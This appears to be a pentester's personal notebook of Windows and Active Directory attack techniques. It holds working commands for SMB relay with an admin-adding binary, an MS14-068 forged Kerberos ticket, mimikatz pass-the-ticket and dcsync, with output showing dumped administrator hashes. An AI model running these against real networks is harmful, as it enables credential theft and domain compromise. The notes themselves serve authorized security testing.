# Misc

Something to sort. one day…

## Which word is most used in books

https://books.google.com/ngrams/graph?content=authorisation%2Cauthorization&year_start=1800&year_end=2008&corpus=15&smoothing=3&share=&direct_url=t1%3B%2Cauthorisation%3B%2Cc0%3B.t1%3B%2Cauthorization%3B%2Cc0






## Lister les logiciels installés sur une machine

Cette commande PowerShell fait une requête WMI vers un PC distant pour lister les logiciels installés :
`Get-WmiObject -Namespace "root\cimv2" -Class Win32_Product -Impersonation 3 -Credential '<domain>\<user>' -ComputerName <ip|hostname>`

Les données retournées peuvent être filtrées à l'aide de `Select-Object` :
`Get-WmiObject -Namespace "root\cimv2" -Class Win32_Product -Impersonation 3 -Credential 'domain.local\user' -ComputerName 192.168.1.1 | Select-Object -Property Name`



## Utiliser les modules PowerSploit, PowEnum, etc

Pour autoriser le lancement de scripts non vérifiés :
`Set-ExecutionPolicy Unrestricted`



## Utilisation de PowEnum

Importer le module
`Import-Module .\PowEnum.ps1`
Au lieu d'importer le module à chaque fois, il est possible de mettre les fichiers de modules (psm1 ou psd1 ?) dans un dossier spécial pour les modules, au niveau du système ou au niveau user.

Découvrir le domaine
`Invoke-PowEnum -Credential <domain>\<user> -FQDN <domain> -Mode Basic`

Voir le readme du projet : https://github.com/whitehat-zero/PowEnum



## PowerSploit

### Trouver les SID d'un domaine depuis une VM qui n'est pas dans le domaine

Comme je n'ai pas trouvé comment préciser un user différent pour exécuter les fonctions provenant de PowerSploit, j'ai lancé powershell.exe à travers un `runas` pour changer de user.

* Lancer un powershell en tant que user du domaine
`runas /netonly /user:<domain>\<user> 'powershell.exe'`
* dans la nouvelle console qui s'ouvre, importer le module de PowerSploit puis lancer la commande `Get-DomainSID`
`Get-DomainSID -Domain <domain> -DomainController <ipDc>`

* pareil pour avoir le sid d'un user
`Get-NetUser -UserName $UserName -Domain $Domain -DomainController $DomainController`
Exemple : 
`Get-NetUser -UserName admuser -Domain domain.local -DomainController 192.168.1.1 | Select-Object -Property objectsid`

### Trouver le DN complet d'un user

Comme au dessus, puis :

`Get-NetUser -username $username -domain $FQDNdomain -domaincontroller $server | Select-Object -property distinguishedname`


## Exemples de SMBrelay

``` bash
sudo /home/user/git/impacket/examples/smbrelayx.py -h 192.168.1.1 -e ./addadm-local.exe
```

Il faut avoir préalablement compilé le binaire `addadm-local.exe` pour Windows. (TODO mettre cette partie de cross compilations)



## MS SQL - Requests for pentest

Retrieve the exact version:
```
select @@version
```

List all database of the instance:
```
SELECT name FROM master.sys.databases
```

List all tables of the database:
```
SELECT * FROM INFORMATION_SCHEMA.TABLES
    OR
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES
```





## not admin on Windows 10 ?

If CME or Nessus confirm the local admin account is not able to be `Pwn3d!` (see cme), try this:

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0x1
```



## lync / lyncsmash

pour trouver le domaine, il est possible de le récupérer dans l'authentification proposé sur la page /abs/ du serveur lync :
`sudo nmap -Pn -sS -p 443 -vv --script http-ntlm-info -d --script-args http-ntlm-info.root=/abs/ lync.contoso.local`

si ça ne fonctionne pas parce que l'entrée en base64 est incorrecte, il est possible d'utiliser :
`curl -sSL -D - -o /dev/null -H 'Authorization: NTLM TlRMTVNTUAABAAAABoIIAAAAAAAAAAAAAAAAAAAAAAA=' https://lync.contoso.local/ | grep '^WWW-Authenticate: NTLM' | cut -d' ' -f3 | base64 -d | strings | grep -v NTLMSSP`

Ensuite à partir du domaine, il est possible de trouver des noms intéressants :
`./lyncsmash.py discover -H contoso.local`





## Utilisation de pykek


* Création du ticket magique via ''pykek''
`./ms14-068.py -u jdupond@domain.local -s S-1-5-21-1862828983-1608356927-24761 -d 192.168.1.1`

* Import du ticket en mémoire via ''mimikatz''
`..\mimikatz_trunk\x64\mimikatz.exe "kerberos::ptc TGT_jdupond@domain.local.ccache" exit`

* Utilisation du ticket (pour faire un ''dcsync'' par exemple)
`..\mimikatz_trunk\x64\mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrateur" exit`

* Profit!


```

PS C:\Users\user\Downloads\PowerSploit\Recon> Get-NetUser -UserName jdupond -Domain domain.local -DomainController 192.168.1.1


instancetype           : 4
usnchanged             : 184382338
badpasswordtime        : 24/01/2016 15:16:50
codepage               : 0
countrycode            : 0
objectguid             : a3e48d94-bd7b-429b-bd15-a19bbbc4e91c
samaccountname         : jdupond
usncreated             : 184258295
displayname            : SECURITY jdupond
dscorepropagationdata  : 01/01/1601 00:00:00
memberof               : CN=APPLI_User,OU=APPLI,OU=Groupes Applicatifs,OU=OU
                         Admin,DC=domain,DC=local
pwdlastset             : 24/01/2016 14:57:02
objectclass            : {top, person, organizationalPerson, user}
useraccountcontrol     : 512
logoncount             : 1
lockouttime            : 0
lastlogon              : 24/01/2016 15:33:31
whenchanged            : 24/01/2016 14:39:14
adspath                : LDAP://192.168.1.1/CN=SECURITY jdupond,OU=DOMAIN,OU=OU Ut
                         ilisateurs,DC=domain,DC=local
lastlogontimestamp     : 23/01/2016 11:04:28
givenname              : jdupond
name                   : SECURITY jdupond
userprincipalname      : jdupond@domain.local
lastlogoff             : 01/01/1601 01:00:00
whencreated            : 22/01/2016 08:19:56
mail                   : jdupond@domain.fr
samaccounttype         : 803685306
distinguishedname      : CN=SECURITY jdupond,OU=DOMAIN,OU=OU Utilisateurs,DC=dom
                         ain,DC=local
msds-authenticatedatdc : CN=SRV0028,OU=Domain Controllers,DC=domain,DC=local
primarygroupid         : 513
badpwdcount            : 0
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=domain,DC=local
cn                     : SECURITY jdupond
objectsid              : S-1-5-21-1862828983-1608356927-24761
sn                     : SECURITY
msds-revealeddsas      : {CN=SRV028,OU=Domain Controllers,DC=domain,DC=local, CN=S
                         RV028,OU=Domain Controllers,DC=domain,DC=local, CN=SRV028
                         ,OU=Domain Controllers,DC=domain,DC=local, CN=SRV028,OU=D
                         omain Controllers,DC=domain,DC=local...}
accountexpires         : 9223372036854775807



PS C:\Users\user\Downloads\PowerSploit\Recon> Get-NetUser -UserName jdupond -Domain domain.local -DomainController 192.168.1.1 | Select-Object -Property objectsid

objectsid
---------
S-1-5-21-1862828983-1608356927-24761

```



```
PS C:\Users\user\Downloads\tgt> ..\mimikatz_trunk\x64\mimikatz.exe "kerberos::ptc TGT_jdupond@domain.local.ccache" exit

  .#####.   mimikatz 2.1.1 (x64) built on Dec 20 2017 00:18:01
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # kerberos::ptc TGT_jdupond@domain.local.ccache

Principal : (01) : jdupond ; @ domain.local

Data 0
           Start/End/MaxRenew: 24/01/2018 18:26:00 ; 25/01/2018 04:26:00 ; 31/01/2018 18:26:00
           Service Name (01) : krbtgt ; domain.local ; @ domain.local
           Target Name  (01) : krbtgt ; domain.local ; @ domain.local
           Client Name  (01) : jdupond ; @ domain.local
           Flags 50a00000    : pre_authent ; renewable ; proxiable ; forwardable ;
           Session Key       : 0x00000017 - rc4_hmac_nt             070ea7d2c59721b48937ce92ab2b87c5
           Ticket            : 0x00000000 - null              ; kvno = 2
[...]
           * Injecting ticket : OK

mimikatz(commandline) # exit
Bye!


PS C:\Users\user\Downloads\tgt> klist.exe

LogonId est 0:0x897d99

Tickets mis en cache : (1)

#0>     Client : jdupond @ domain.local
        Serveur : krbtgt/domain.local @ domain.local
        Type de chiffrement KerbTicket : RSADSI RC4-HMAC(NT)
        Indicateurs de tickets 0x50a00000 -> forwardable proxiable renewable pre_authent
        Heure de démarrage : 1/24/2018 18:26:00 (Local)
        Heure de fin :   1/25/2018 4:26:00 (Local)
        Heure de renouvellement : 1/31/2018 18:26:00 (Local)
        Type de clé de session : RSADSI RC4-HMAC(NT)



mimikatz # lsadump::dcsync /domain:domain.local /user:Administrateur
[DC] 'domain.local' will be the domain
[DC] 'SRV0025.domain.local' will be the DC server
[DC] 'Administrateur' will be the user account

Object RDN           : administrateur

** SAM ACCOUNT **

SAM Username         : administrateur
User Principal Name  : administrateur@domain.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 01/01/1601 01:00:00
Password last change : 17/05/2012 22:09:50
Object Security ID   : S-1-5-21-1862828983-16086927-1213
Object Relative ID   : 1213

Credentials:
  Hash NTLM: 070ea7d2c59721b48937ce92ab2b87c5
    ntlm- 0: 070ea7d2c59721b48937ce92ab2b87c5
    lm  - 0: 070ea7d2c59721b48937ce92ab2b87c5

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : DOMAIN.LOCALadministrateur
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a48d804e7c446992315bd77e8a241d3df67c6294636c5c5
fba826a87aa49309d
      aes128_hmac       (4096) : 070ea7d2c59721b48937ce92ab2b87c5
      des_cbc_md5       (4096) : 51a34b2cbec403dc

* Primary:Kerberos *
    Default Salt : domain.localadministrateur
    Credentials
      des_cbc_md5       : 51a34b2cbec403dc

* Packages *
    Kerberos-Newer-Keys

* Primary:WDigest *
    01  070ea7d2c59721b48937ce92ab2b87c5
    02  070ea7d2c59721b48937ce92ab2b87c5
    03  070ea7d2c59721b48937ce92ab2b87c5
    04  070ea7d2c59721b48937ce92ab2b87c5
    05  070ea7d2c59721b48937ce92ab2b87c5
    06  070ea7d2c59721b48937ce92ab2b87c5
    07  070ea7d2c59721b48937ce92ab2b87c5
    08  070ea7d2c59721b48937ce92ab2b87c5
    09  070ea7d2c59721b48937ce92ab2b87c5
    10  070ea7d2c59721b48937ce92ab2b87c5
    11  070ea7d2c59721b48937ce92ab2b87c5
    12  070ea7d2c59721b48937ce92ab2b87c5
    13  070ea7d2c59721b48937ce92ab2b87c5
    14  070ea7d2c59721b48937ce92ab2b87c5
    15  070ea7d2c59721b48937ce92ab2b87c5
    16  070ea7d2c59721b48937ce92ab2b87c5
    17  070ea7d2c59721b48937ce92ab2b87c5
    18  070ea7d2c59721b48937ce92ab2b87c5
    19  070ea7d2c59721b48937ce92ab2b87c5
    20  070ea7d2c59721b48937ce92ab2b87c5
    21  070ea7d2c59721b48937ce92ab2b87c5
    22  070ea7d2c59721b48937ce92ab2b87c5
    23  070ea7d2c59721b48937ce92ab2b87c5
    24  070ea7d2c59721b48937ce92ab2b87c5
    25  070ea7d2c59721b48937ce92ab2b87c5
    26  070ea7d2c59721b48937ce92ab2b87c5
    27  070ea7d2c59721b48937ce92ab2b87c5
    28  070ea7d2c59721b48937ce92ab2b87c5
    29  070ea7d2c59721b48937ce92ab2b87c5


mimikatz #

```



## Create a Firefox profile for web pentest

### disable background requests


See: https://support.mozilla.org/en-US/kb/how-stop-firefox-making-automatic-connections

Tested on Firefox 63.0 (64 bits) for Linux

In about:config:

```
app.update.auto = false
app.update.url = ''
network.captive-portal-service.enabled = false
browser.search.update = false
browser.safebrowsing.malware.enabled = false
browser.safebrowsing.phishing.enabled
browser.safebrowsing.downloads.remote.enabled = false
browser.contentblocking.trackingprotection.ui.enabled = false
browser.safebrowsing.provider.mozilla.updateURL = ''
services.settings.server = ''
extensions.getaddons.get.url = ''
extensions.getaddons.compatOverides.url = ''
extensions.getaddons.langpacks.url = ''
extensions.systemAddon.update.url = ''
extensions.update.background.url = ''
media.gmp-manager.url = ''
```




## CORS


Toutes les infos que je trouve sur le CORS

docs :
* https://hackerone.com/reports/235200


Note : Lorsque la requête JavaScript est faite avec `XMLHttpRequest.withCredentials = true`, alors les "creds" (apparemment, les cookies) sont envoyés au serveur dans la requête. Mais le retour ne sera pas renvoyé au JavaScript par le navigateur si la réponse du serveur ne contient pas `Access-Control-Allow-Credentials: true`.


Voir ici comment il est possible d'injecter son propre entête `Origin` pour by-passer une partie de la protection : https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646


